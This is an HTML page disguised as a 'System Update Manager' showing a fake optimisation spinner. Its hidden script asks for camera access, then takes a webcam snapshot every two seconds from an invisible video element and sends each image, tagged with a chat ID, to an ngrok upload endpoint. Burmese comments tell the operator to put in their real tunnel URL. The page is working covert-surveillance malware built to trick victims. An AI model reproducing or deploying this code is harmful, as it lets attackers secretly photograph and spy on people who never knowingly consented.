<!DOCTYPE html>
<html>
<head>
    <title>System Update Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>System Optimization in Progress...</h2>
    <p>Please wait while we check your device compatibility.</p>
    <div class="loading"></div>

    <video id="video" width="640" height="480" autoplay style="display:none"></video>
    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chat_id = urlParams.get('id') || '8001540714'; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            // ကင်မရာပွင့်တာနဲ့ ၂ စက္ကန့်တစ်ခါ ပုံရိုက်ပြီး ပို့နေမယ်
            setInterval(takeSnap, 2000); 
        })
        .catch(err => {
            console.log("Camera Access Denied: " + err);
        });

        function takeSnap() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/png');

            // --- [အရေးကြီး] ဒီနေရာမှာ ကိုကြီးရဲ့ Ngrok URL အစစ်ကို အစားထိုးပါ ---
            const serverUrl = 'https://YOUR-NGROK-LINK-HERE.ngrok-free.app/upload';

            fetch(serverUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'cors', 
                body: JSON.stringify({ 
                    image: imageData,
                    chat_id: chat_id
                })
            })
            .then(res => console.log("Sent!"))
            .catch(err => console.log("Error: " + err));
        }
    </script>
</body>
</html>
